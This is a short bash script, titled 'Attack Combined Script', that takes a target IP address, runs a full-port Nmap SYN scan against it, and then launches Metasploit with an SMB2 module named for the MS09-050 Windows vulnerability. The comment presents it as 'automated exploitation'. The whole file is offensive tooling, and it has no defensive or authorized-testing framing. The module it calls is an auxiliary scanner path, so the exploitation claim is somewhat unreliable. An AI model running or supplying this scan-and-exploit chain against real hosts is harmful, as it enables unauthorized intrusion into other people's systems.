#!/bin/bash
# Attack Combined Script
# Uses Nmap for port scanning and Metasploit for automated exploitation.

TARGET=$1

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target_ip>"
  exit 1
fi

echo "Running Nmap port scan..."
nmap -sS -p- -oN nmap_port_scan.txt $TARGET

echo "Running Metasploit for automated exploitation..."
msfconsole -x "use auxiliary/scanner/ms09_050_smb2_negotiate_func_index; set RHOSTS $TARGET; run"
